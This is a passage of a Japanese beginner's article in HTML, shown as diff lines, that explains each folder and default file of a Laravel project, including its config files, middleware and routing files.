+<p><a href="https://team-lab.github.io/skillup-nodejs/2/4.html" rel="nofollow noopener" target="_blank">npm</a>(Node.jsで書かれたJavaScriptのパッケージ管理ツール)で利用するプログラム。</p>
+
+<h4>
+<span id="phpunitxml" class="fragment"></span><a href="#phpunitxml"><i class="fa fa-link"></i></a><strong><code>phpunit.xml</code></strong>
+</h4>
+
+<p><a href="https://thinkit.co.jp/article/1186/1" rel="nofollow noopener" target="_blank">PHPUnit</a>(ユニットテスト)に関する記述。</p>
+
+<h4>
+<span id="serverphp" class="fragment"></span><a href="#serverphp"><i class="fa fa-link"></i></a><strong><code>server.php</code></strong>
+</h4>
+
+<p>ビルトインサーバー起動時に使用されるプログラム。</p>
+
+<h4>
+<span id="webpackmixjs" class="fragment"></span><a href="#webpackmixjs"><i class="fa fa-link"></i></a><strong><code>webpack.mix.js</code></strong>
+</h4>
+
+<p>JavaScriptパッケージ管理ツール<a href="https://ics.media/entry/12140" rel="nofollow noopener" target="_blank">webpack</a>に関する記述。</p>
+
+<h4>
+<span id="yarnlock" class="fragment"></span><a href="#yarnlock"><i class="fa fa-link"></i></a><strong><code>yarn.lock</code></strong>
+</h4>
+
+<p><a href="https://qiita.com/morrr/items/558bf64cd619ebdacd3d" id="reference-51a50775699a05342b03">yarn</a>というフロントエンドパッケージマネージャに関する自動生成ファイル。</p>
+
+<h2>
+<span id="メインディレクトリ群" class="fragment"></span><a href="#%E3%83%A1%E3%82%A4%E3%83%B3%E3%83%87%E3%82%A3%E3%83%AC%E3%82%AF%E3%83%88%E3%83%AA%E7%BE%A4"><i class="fa fa-link"></i></a>メインディレクトリ群</h2>
+
+<h1>
+<span id="app" class="fragment"></span><a href="#app"><i class="fa fa-link"></i></a><strong><font color="RoyalBlue">app</font></strong>
+</h1>
+
+<p>アプリケーションのプログラム部分、いわば主軸になるもの。アプリ開発時において、ここをメインにスクリプトファイルを追加していく。</p>
+
+<h4>
+<span id="console" class="fragment"></span><a href="#console"><i class="fa fa-link"></i></a><strong>Console</strong>
+</h4>
+
+<hr>
+
+<p>コンソールプログラム群。<br>
+<code>php artisan make:command data_init</code><br>
+などとすると、自分でartisanコマンドを追加作成でき、ここに生成されます。</p>
+
+<h5>
+<span id="--kernelphp" class="fragment"></span><a href="#--kernelphp"><i class="fa fa-link"></i></a>- <em><code>Kernel.php</code></em>
+</h5>
+
+<p>＝＞作ったコマンドを登録するファイル。</p>
+
+<h4>
+<span id="exception" class="fragment"></span><a href="#exception"><i class="fa fa-link"></i></a><strong>Exception</strong>
+</h4>
+
+<hr>
+
+<p>例外処理に関する記述。<br>
+<a href="https://readouble.com/laravel/5.3/ja/errors.html" rel="nofollow noopener" target="_blank">Laravel 5.3 エラーとログ</a></p>
+
+<h5>
+<span id="--handlerphp" class="fragment"></span><a href="#--handlerphp"><i class="fa fa-link"></i></a>- <em><code>Handler.php</code></em>
+</h5>
+
+<p>＝＞<strong>report</strong>(例外をログするか、外部サービスに送信するために使う)と<strong>render</strong>(例外をブラウザーに送り返すHTTPレスポンスへ変換)の、二つのメソッドで構成されている。</p>
+
+<h4>
+<span id="http" class="fragment"></span><a href="#http"><i class="fa fa-link"></i></a><strong>Http</strong>
+</h4>
+
+<hr>
+
+<p>アプリケーションにアクセスした時に実行される処理をまとめたところ。Laravelの心臓部。</p>
+
+<h5>
+<span id="--controllers" class="fragment"></span><a href="#--controllers"><i class="fa fa-link"></i></a>- <strong>Controllers</strong>
+</h5>
+
+<p><strong><a href="http://ossforum.jp/node/613" rel="nofollow noopener" target="_blank">MVCアーキテクチャ</a></strong>の根幹。Webページの具体的な処理が記述されます。<br>
+全体を統制し、Modelでデータのやり取りをしたり、Viewを呼び出す処理をします。<br>
+<a href="https://qiita.com/tshinsay/items/5b1724baf32b8b5113c2" id="reference-42550ee2a1a600cc0023">MVC、本当にわかってますか？</a></p>
+
+<h5>
+<span id="--middleware" class="fragment"></span><a href="#--middleware"><i class="fa fa-link"></i></a>- <strong>Middleware</strong>
+</h5>
+
+<p>コントローラーが動く前か後に、アプリケーションへ送信されたHTTPリクエストをフィルタリングする、特定の処理を行う仕組み。<br>
+アクセスがあった時に毎度何かを実行するための機能。<br>
+<a href="https://qiita.com/sogawa@github/items/c6ac3e9f46447aa32668" id="reference-259370a7c7aff615281e">Laravel5のミドルウェアの使い方</a></p>
+
+<h5>
+<span id="--kernelphp-1" class="fragment"></span><a href="#--kernelphp-1"><i class="fa fa-link"></i></a>- <em><code>Kernel.php</code></em>
+</h5>
+
+<p>あるミドルウェアをアプリケーションの全リクエストで実行したい場合は、このファイルの<strong>$middleware</strong>プロパティへ追加する。</p>
+
+<p><strong>【デフォルトのグローバルミドルウェア[Webグループ]】</strong></p>
+
+<p><strong>CheckForMaintenanceMode</strong><br>
+=&gt;メンテナンスモードかどうかをチェックする。メンテナンスモードだったら503を返す。</p>
+
+<p><strong>EncryptCookies</strong><br>
+=&gt;クッキー暗号化。</p>
+
+<p><strong>AddQueuedCookiesToResponse</strong><br>
+=&gt;クッキーを使わなければいらないもの</p>
+
+<p><strong>StartSession</strong><br>
+=&gt;セッションを使わなければいらないもの</p>
+
+<p><strong>ShareErrorsFromSession</strong><br>
+=&gt;セッションに<strong>errors</strong>という名前で登録された内容をすべてのビューで共有している</p>
+
+<p><strong>VerifyCsrfToken</strong><br>
+=&gt;<a href="https://www.trendmicro.com/ja_jp/security-%0Aintelligence/research-reports/threat-solution/csrf.html" rel="nofollow noopener" target="_blank">CSRF(クロスサイトリクエストフォージェリ)</a>チェック。</p>
+
+<p><strong>SubstituteBindings</strong><br>
+<em>Route Model Binding</em>(今までモデルのIDを受け取っていた箇所で、代わりにIDに対応するモデルのインスタンスを受け取れる) を実行する機能（Laravel5.3から追加）</p>
+
+<p>他に、apiグループもあります。<br>
+気になる方は以下の記事、参照ください。</p>
+
+<p><a href="https://qiita.com/kurikazu/items/0c57f050f5dfef02b23e" id="reference-edf147e0940068e0bd91">[Laravel]ミドルウェアを整理してLaravelを軽くする</a></p>
+
+<p>これらを整理すると、アプリケーションがかなり軽くなるみたいです。</p>
+
+<h4>
+<span id="providers" class="fragment"></span><a href="#providers"><i class="fa fa-link"></i></a><strong>Providers</strong>
+</h4>
+
+<hr>
+
+<p>ビューにビジネスロジックをもたせたいとき、ビューコンポーザ機能(ビューレンダリングの際の、自動実行処理)を利用するための、プロバイダと呼ばれるプログラムが配置される。</p>
+
+<h5>
+<span id="--serviceprovider" class="fragment"></span><a href="#--serviceprovider"><i class="fa fa-link"></i></a>- <strong>ServiceProvider</strong>
+</h5>
+
+<p>bootメソッド(<strong>アプリケーションが実行される前に割り込んで実行される、ブートストラップ処理</strong>)に関する記述</p>
+
+<h4>
+<span id="userphp" class="fragment"></span><a href="#userphp"><i class="fa fa-link"></i></a><em><code>User.php</code></em>
+</h4>
+
+<hr>
+
+<p>ユーザー認証に関する、Userモデルのスクリプトファイル<br>
+モデルはデフォルトだと<code>php artisan make:model ~~</code>した時にこの階層(app直下)に生成される。Laravelはモデルの置き場所がデフォルトだと、ありません。言葉の定義の問題だそうです。<br>
+以下が、そのモデルディレクトリがない理由です。</p>
+
+<blockquote>
+<p><a href="https://readouble.com/laravel/5.3/ja/structure.html" rel="nofollow noopener" target="_blank">Laravel 5.3 ディレクトリ構造</a><br>
+Laravelを学習し始めるとき、多くの開発者はmodelsディレクトリが存在しないことに戸惑います。しかし、意図的にこのディレクトリを用意していません。多くの別々の人達にとって、その意味合いは様々なため、"models"という言葉の定義は曖昧であることに私達は気づきました。ある開発者たちはすべてのビジネスロジックを総称してアプリケーションの「モデル」と呼び、一方で別の人達はリレーショナルデータベースに関連するクラスを「モデル」として参照しています。<br>
+このため、私達はEloquentモデルをデフォルトではappディレクトリ下へ設置することを選択し、開発者自分が選んだどこか別の場所へ設置してもらうことにしました。</p>
+</blockquote>
+
+<h1>
+<span id="bootstrap" class="fragment"></span><a href="#bootstrap"><i class="fa fa-link"></i></a><strong><font color="RoyalBlue">bootstrap</font></strong>
+</h1>
+
+<p>アプリケーション実行時に、同時に行われる最初の処理がまとめられている。</p>
+
+<h4>
+<span id="cache" class="fragment"></span><a href="#cache"><i class="fa fa-link"></i></a><strong>cache</strong>
+</h4>
+
+<hr>
+
+<p>初期処理のパフォーマンス最適化のため、ルートやサービスのキャッシュファイルが保存されるフォルダ。</p>
+
+<h4>
+<span id="appphp" class="fragment"></span><a href="#appphp"><i class="fa fa-link"></i></a><em><code>app.php</code></em>
+</h4>
+
+<hr>
+
+<p>初期起動やオートローディングの設定</p>
+
+<h1>
+<span id="config" class="fragment"></span><a href="#config"><i class="fa fa-link"></i></a><strong><font color="RoyalBlue">config</font></strong>
+</h1>
+
+<p>アプリケーションの全設定ファイルがまとまっている。<br>
+<a href="https://readouble.com/laravel/5.3/ja/configuration.html" rel="nofollow noopener" target="_blank">Laravel 5.3 設定</a></p>
+
+<h5>
+<span id="appphp-1" class="fragment"></span><a href="#appphp-1"><i class="fa fa-link"></i></a><em><code>app.php</code></em>
+</h5>
+
+<p>-&gt;アプリ主要情報、タイムゾーンや地理情報の設定。</p>
+
+<h5>
+<span id="authphp" class="fragment"></span><a href="#authphp"><i class="fa fa-link"></i></a><em><code>auth.php</code></em>
+</h5>
+
+<p>-&gt;認証設定</p>
+
+<h5>
+<span id="broadcastingphp" class="fragment"></span><a href="#broadcastingphp"><i class="fa fa-link"></i></a><em><code>broadcasting.php</code></em>
+</h5>
+
+<p>-&gt;<a href="https://readouble.com/laravel/5.3/ja/broadcasting.html" rel="nofollow noopener" target="_blank">イベントブロードキャスト</a>の設定</p>
+
+<h5>
+<span id="cachephp" class="fragment"></span><a href="#cachephp"><i class="fa fa-link"></i></a><em><code>cache.php</code></em>
+</h5>
+
+<p>-&gt;キャッシュ設定</p>
+
+<h5>
+<span id="databasephp" class="fragment"></span><a href="#databasephp"><i class="fa fa-link"></i></a><em><code>database.php</code></em>
+</h5>
+
+<p>-&gt;データベース使用設定。</p>
+
+<h5>
+<span id="filesystemsphp" class="fragment"></span><a href="#filesystemsphp"><i class="fa fa-link"></i></a><em><code>filesystems.php</code></em>
+</h5>
+
+<p>-&gt;<a href="https://readouble.com/laravel/5.4/ja/filesystem.html" rel="nofollow noopener" target="_blank">ファイルストレージ</a>などの設定<br>
+<a href="https://liginc.co.jp/355887" rel="nofollow noopener" target="_blank">それはそれは素晴らしい『Laravel』のファイルシステムについて語りたい</a></p>
+
+<h5>
+<span id="mailphp" class="fragment"></span><a href="#mailphp"><i class="fa fa-link"></i></a><em><code>mail.php</code></em>
+</h5>
+
+<p>-&gt;メールサーバーの設定<br>
+<a href="https://liginc.co.jp/369690" rel="nofollow noopener" target="_blank">洗練された『Laravel』のメール送信機能を使ってみる</a></p>
+
+<h5>
+<span id="queuephp" class="fragment"></span><a href="#queuephp"><i class="fa fa-link"></i></a><em><code>queue.php</code></em>
+</h5>
+
+<p>-&gt;<a href="http://tech.voyagegroup.com/archives/495474.html" rel="nofollow noopener" target="_blank">ジョブキュー</a>の設定</p>
+
+<h5>
+<span id="servicesphp" class="fragment"></span><a href="#servicesphp"><i class="fa fa-link"></i></a><em><code>services.php</code></em>
+</h5>
+
+<p>-&gt;MailgunやSparkPostなどの<a href="https://readouble.com/laravel/5.3/ja/mail.html" rel="nofollow noopener" target="_blank">APIベースドライバ</a>設定</p>
+
+<h5>
+<span id="sessionphp" class="fragment"></span><a href="#sessionphp"><i class="fa fa-link"></i></a><em><code>session.php</code></em>
+</h5>
+
+<p>-&gt;<a href="https://readouble.com/laravel/5.3/ja/session.html" rel="nofollow noopener" target="_blank">セッションドライバ</a>設定</p>
+
+<h5>
+<span id="viewphp" class="fragment"></span><a href="#viewphp"><i class="fa fa-link"></i></a><em><code>view.php</code></em>
+</h5>
+
+<p>-&gt;ビューテンプレート設定</p>
+
+<h1>
+<span id="database" class="fragment"></span><a href="#database"><i class="fa fa-link"></i></a><strong><font color="RoyalBlue">database</font></strong>
+</h1>
+
+<p>データベース関連のファイルのまとまり。</p>
+
+<h4>
+<span id="factories" class="fragment"></span><a href="#factories"><i class="fa fa-link"></i></a><strong>factories</strong>
+</h4>
+
+<hr>
+
+<p>Eloquentモデルの各属性にデフォルトを設定できる。ランダムデータを生成するFakerに関するもの。<br>
+<a href="https://qiita.com/tanakahisateru/items/c4d39cc77a71067ed658" id="reference-af13aa5048c8b9e627e4">Fakerで自動テスト用のダミーデータ作成を自動化する</a></p>
+
+<h4>
+<span id="migrations" class="fragment"></span><a href="#migrations"><i class="fa fa-link"></i></a><strong>migrations</strong>
+</h4>
+
+<hr>
+
+<p>データベースの<a href="https://readouble.com/laravel/5.3/ja/migrations.html" rel="nofollow noopener" target="_blank">マイグレーション</a>ファイル置き場</p>
+
+<h4>
+<span id="seeds" class="fragment"></span><a href="#seeds"><i class="fa fa-link"></i></a><strong>seeds</strong>
+</h4>
+
+<hr>
+
+<p>初期値設定（シーディング）。<br>
+<a href="https://readouble.com/laravel/5.1/ja/seeding.html" rel="nofollow noopener" target="_blank">Laravel 5.1 データベース：シーディング</a></p>
+
+<h1>
+<span id="public" class="fragment"></span><a href="#public"><i class="fa fa-link"></i></a><strong><font color="RoyalBlue">public</font></strong>
+</h1>
+
+<p>外部にそのまま公開されるフォルダ。CSSやJavaScriptが配置される。</p>
+
+<h4>
+<span id="css" class="fragment"></span><a href="#css"><i class="fa fa-link"></i></a><strong>css</strong>
+</h4>
+
+<hr>
+
+<h4>
+<span id="js" class="fragment"></span><a href="#js"><i class="fa fa-link"></i></a><strong>js</strong>
+</h4>
+
+<hr>
+
+<h5>
+<span id="htaccess" class="fragment"></span><a href="#htaccess"><i class="fa fa-link"></i></a><em><code>.htaccess</code></em>
+</h5>
+
+<p><a href="http://viral-community.com/blog/htaccess-3065/" rel="nofollow noopener" target="_blank">.htaccessとは？.htaccessで、できる事と設定手順についてまとめてみた</a></p>
+
+<h5>
+<span id="faviconico" class="fragment"></span><a href="#faviconico"><i class="fa fa-link"></i></a><em><code>favicon.ico</code></em>
+</h5>
+
+<p><a href="http://www.geekpage.jp/web/access-log/favicon.php" rel="nofollow noopener" target="_blank">favicon.icoとは？</a></p>
+
+<h5>
+<span id="indexphp" class="fragment"></span><a href="#indexphp"><i class="fa fa-link"></i></a><em><code>index.php</code></em>
+</h5>
+
+<p>初期ビュー</p>
+
+<h5>
+<span id="robotstxt" class="fragment"></span><a href="#robotstxt"><i class="fa fa-link"></i></a><em><code>robots.txt</code></em>
+</h5>
+
+<p>Webクローラーに対して、特定のページをインデックスに登録しないように指定するファイルです。</p>
+
+<h1>
+<span id="resources" class="fragment"></span><a href="#resources"><i class="fa fa-link"></i></a><strong><font color="RoyalBlue">resources</font></strong>
+</h1>
+
+<p>リソース関係の配置場所。プログラムが必要とするテンプレートやアセットが用意されます。<br>
+<a href="http://wa3.i-3-i.info/word1481.html" rel="nofollow noopener" target="_blank">リソース (resource)とは｜「分かりそう」で「分からない」でも「分かった」気になれるIT用語辞典</a></p>
+
+<h4>
+<span id="assets" class="fragment"></span><a href="#assets"><i class="fa fa-link"></i></a><strong>assets</strong>
+</h4>
+
+<hr>
+
+<p>ここにあるファイルは、自動的に<a href="https://readouble.com/laravel/5.1/ja/elixir.html" rel="nofollow noopener" target="_blank"><strong>Elixir</strong></a>(CSS,Javascriptプリプロセッサー)がpublic/cssやpublic/jsへコピーしてくれます。</p>
+
+<h4>
+<span id="lang" class="fragment"></span><a href="#lang"><i class="fa fa-link"></i></a><strong>lang</strong>
+</h4>
+
+<hr>
+
+<p>言語仕様。</p>
+
+<h4>
+<span id="views" class="fragment"></span><a href="#views"><i class="fa fa-link"></i></a><strong>views</strong>
+</h4>
+
+<hr>
+
+<p>ビューファイルの置き場所です。</p>
+
+<h1>
+<span id="routes" class="fragment"></span><a href="#routes"><i class="fa fa-link"></i></a><strong><font color="RoyalBlue">routes</font></strong>
+</h1>
+
+<p>アクセスするアドレスに割り当てられるプログラムの情報。ルーティング。</p>
+
+<h5>
+<span id="apiphp" class="fragment"></span><a href="#apiphp"><i class="fa fa-link"></i></a><em><code>api.php</code></em>
+</h5>
+
+<p>APIのルーティング。プログラム内から利用する、APIのアドレスを割り当てるのに利用する。</p>
+
+<h5>
+<span id="channelsphp" class="fragment"></span><a href="#channelsphp"><i class="fa fa-link"></i></a><em><code>channels.php</code></em>
+</h5>
+
+<p><a href="https://readouble.com/laravel/5.3/ja/broadcasting.html" rel="nofollow noopener" target="_blank">ブロードキャストチャンネル</a>のためのルーティング。</p>
+
+<h5>
+<span id="consolephp" class="fragment"></span><a href="#consolephp"><i class="fa fa-link"></i></a><em><code>console.php</code></em>
+</h5>
+
+<p>コンソールプログラムのためのルーティング。</p>
+
+<h5>
+<span id="webphp" class="fragment"></span><a href="#webphp"><i class="fa fa-link"></i></a><em><code>web.php</code></em>
+</h5>
+
+<p>一般的なWebページとしてアクセスするためのルーティング。主にここを編集する。</p>
+
+<h1>
+<span id="storage" class="fragment"></span><a href="#storage"><i class="fa fa-link"></i></a><strong><font color="RoyalBlue">storage</font></strong>
+</h1>
+
+<p>ファイルの保存場所。アプリケーションのログファイルや画像などが保存される。</p>
+
+<h4>
+<span id="app-1" class="fragment"></span><a href="#app-1"><i class="fa fa-link"></i></a><strong>app</strong>
+</h4>
+
+<hr>
+
+<h4>
+<span id="framework" class="fragment"></span><a href="#framework"><i class="fa fa-link"></i></a><strong>framework</strong>
+</h4>
+
+<hr>
+
+<h4>
+<span id="logs" class="fragment"></span><a href="#logs"><i class="fa fa-link"></i></a><strong>logs</strong>
+</h4>
+
+<hr>
+
+<h1>
+<span id="test" class="fragment"></span><a href="#test"><i class="fa fa-link"></i></a><strong><font color="RoyalBlue">test</font></strong>
+</h1>
+
+<p>ユニットテストに関するファイル群。</p>
+
+<h4>
+<span id="feature" class="fragment"></span><a href="#feature"><i class="fa fa-link"></i></a><strong>Feature</strong>
+</h4>
+
+<hr>
+
+<p>機能(Feature)テストは、多くのオブジェクトがそれぞれどのように関係しているなど、コードの幅広い範囲をテストします。</p>
+
+<h4>
+<span id="unit" class="fragment"></span><a href="#unit"><i class="fa fa-link"></i></a><strong>Unit</strong>
+</h4>
+
+<hr>
+
+<p>ユニットテストは、コードの独立した一部をテストする。</p>
+
+<h5>
+<span id="createsapplicationphptestcasephp" class="fragment"></span><a href="#createsapplicationphptestcasephp"><i class="fa fa-link"></i></a><em><code>CreatesApplication.php</code></em>,<em><code>Testcase.php</code></em>
+</h5>
+
+<p>テスト環境用スクリプトファイル</p>
+
+<h1>
+<span id="vendor" class="fragment"></span><a href="#vendor"><i class="fa fa-link"></i></a><strong><font color="RoyalBlue">vendor</font></strong>
+</h1>
+
+<p>Laravelフレームワークの司るライブラリを構成するファイル群。Composerによる依存パッケージが配置される。<br>
+ここは多すぎるので、省略します。</p>
+
+<p>継承元のクラスを参照したいときは<strong><code>laravel/framework/src/illuminate</code></strong>以下を辿るといいでしょう。<br>
+また、状況によりますが、<a href="https://readouble.com/laravel/5.3/ja/facades.html" rel="nofollow noopener" target="_blank">Facades</a>を使うと、コードがより簡潔になり、チーム開発でクラスを共有しやすくなったりと、有利に働きます。</p>
+
+<blockquote>
+<p>ファサード（facade、「入り口」）はアプリケーションのサービスコンテナに登録したクラスへ、「静的」なインターフェイスを提供します。</p>
+</blockquote>
+
+<h1>
+<span id="まとめ" class="fragment"></span><a href="#%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>まとめ</h1>
+
+<p>これからも気づいたこと、指摘いただいたことは記事に反映して学んでいきたいので、ツッコミどころ、足りない部分多々あると思いますが、ビシバシご指導いただけたらと思います。</p>
+</div>
+	</td>
+</tr>
+</table>
+<br />
+	</body>
+</html>
